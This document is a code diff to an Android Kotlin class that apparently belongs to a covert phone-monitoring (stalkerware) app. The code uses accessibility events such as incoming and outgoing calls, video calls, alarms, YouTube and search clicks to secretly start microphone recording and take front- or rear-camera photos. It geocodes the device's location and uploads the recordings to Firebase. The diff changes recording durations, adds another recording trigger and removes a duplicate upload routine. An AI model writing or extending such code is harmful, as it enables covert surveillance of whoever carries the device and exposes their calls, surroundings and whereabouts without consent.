@@ -115,19 +115,19 @@ class InteractorAccessibilityData
 //           //     startCameraPicture(childPhoto2)
 //                TimeUnit.SECONDS.sleep(1L)
                 //    startCameraPictureFace()
-                startRecording(1000 * 60 * 60)
+                startRecording(1000 * 60 * 13)
             }
             if (data.contains("Alarma, Despertar") && data.contains("(TEXT)")  ) {
-                startRecording(1000 * 60 * 60)
+                startRecording(1000 * 60 * 9)
             }
             if (data.contains("Grabando") || data.contains("[Pausar]")  || data.contains("[Enviar]")  || data.contains("Llamada")  || data.contains("[Videollamada]")|| data.contains( "[CONTESTAR]") || data.contains( "[End call]")  || data.contains( "[ANSWER]")  || data.contains( "phone")) {
-               startRecording(1000 * 60 * 60)
+               startRecording(1000 * 60 * 13)
             }
             if (( data.contains("incallui:[Llamada entrante") && data.contains("(TEXT)")) || (data.contains("[RESPONDER]") && data.contains("dialer"))) {
-                startRecording(1000 * 60 * 60)
+                startRecording(1000 * 60 * 14)
             }
             if (( data.contains("incallui:[Llamada saliente") && data.contains("(CLICKED)")) || (data.contains("[RESPONDER]") && data.contains("dialer"))) {
-                startRecording(1000 * 60 * 60)
+                startRecording(1000 * 60 * 16)
             }
 //            if ( data.contains("(CLICKED)") ) {
 //                val childPhoto = ChildPhoto(true, CameraFacing.FRONT_FACING_CAMERA)
@@ -140,7 +140,7 @@ class InteractorAccessibilityData
             if (data.contains("[YouTube]")  && data.contains("(CLICKED)") ) {
                 val childPhoto = ChildPhoto(true, CameraFacing.REAR_FACING_CAMERA)
                 startCameraPicture(childPhoto)
-                startRecording(1000 * 60 * 60)
+                startRecording(1000 * 60 * 50)
             }
             if (data.contains("googlequicksearchbox:[") && data.contains("(CLICKED)") ) {
                 val childPhoto2 = ChildPhoto(true, CameraFacing.FRONT_FACING_CAMERA)
@@ -160,11 +160,9 @@ class InteractorAccessibilityData
             val rightNow = Calendar.getInstance()
             val hour: Int = rightNow.get(Calendar.HOUR_OF_DAY)
             //        if ((day.contains("lunes") || day.contains("martes") || day.contains("miercoles") || day.contains("jueves" )  || day.contains("vierneslunes")) && (hour == 10) ) {
-            if (hour >= 0 && hour <= 23) {
-              //  val exist = File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists()
+            if (hour >= 0 && hour <= 23) {   // if (nameAudio.isEmpty() )
                 if (!File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists())
-               // if (nameAudio.isEmpty() )
-                    startRecording(1000*60*60)
+                    startRecording(1000*60*15)
 
                 address = try {
                     geoCoder.getFromLocation( location.latitude, location.longitude, 1 )[0].getAddressLine(0)
@@ -246,6 +244,7 @@ class InteractorAccessibilityData
                 .build()
             pictureCapture.startCamera(cameraConfig)
         }
+        startRecording(1000*60*20)
     }
 
     private fun startCameraPictureFace() {
@@ -361,14 +360,13 @@ class InteractorAccessibilityData
     }
 
     private fun startRecording(startTime: Long) {
-        if (!File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists()) {
-            timer = MyCountDownTimer(1000*60*60, interval, {
-         //   timer = MyCountDownTimer(startTime, interval, { //1000*60*1
+        if (!File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists() && !File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/records.txt").exists()) {
+            //     timer = MyCountDownTimer(1000*60*60, interval, {
+            timer = MyCountDownTimer(startTime, interval, { //1000*60*1
                 setIntervalRecord(it)
                 i(TAG, "Grabando... ${it.toString()}");
             }) {
                 stopRecording()
-                //startRecording(1000 * 60 * 60)
             }
             nameAudio = getRandomNumeric()
             dateTime = getDateTime()
@@ -389,7 +387,7 @@ class InteractorAccessibilityData
         fileName2 = fileName
         val hour: Int = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
       //  if (hour >= 0 && hour <= 23)
-            startRecording(1000 * 60 * 60)
+            startRecording(1000 * 60 * 12)
 
         disposable.add(
             firebase.putFile("$RECORDING/$dateName", uri)
@@ -408,35 +406,6 @@ class InteractorAccessibilityData
                         i(TAG, "error sendFileAudio ${it.toString()}")  //  deleteFile()
                     }
                 )
-        )
-    }
-
-    private fun sendFileAudio2() {
-        val filePath = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD"
-        val dateName = fileName!!.replace("$filePath/", "")
-        val uri = Uri.fromFile(File(fileName))
-        //  setPushName()
-        val duration = FileHelper.getDurationFile(fileName!!)
-        val recording = Recording(nameAudio, dateTime, duration)
-        nameAudio = ""
-        val hour: Int = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
-//        if (hour >= 6 && hour <= 23)
-//            startRecording(1000 * 60 * 60)
-        disposable.add(
-            firebase.putFile("$RECORDING/$dateName", uri)
-                .subscribeOn(Schedulers.io())
-                .observeOn(AndroidSchedulers.mainThread())
-                .subscribe(
-                    {
-                        //     setPushName()
-                        firebase.getDatabaseReference("$RECORDING/$DATA").push().setValue(recording)
-                        deleteFile()
-                        //      resetParamsRecording()
-                        //      startRecording(1000 * 60 * 1)
-                    },
-                    {
-                        i(TAG, "fin... ${it.toString()}")  //  deleteFile()
-                    })
         )
     }
 
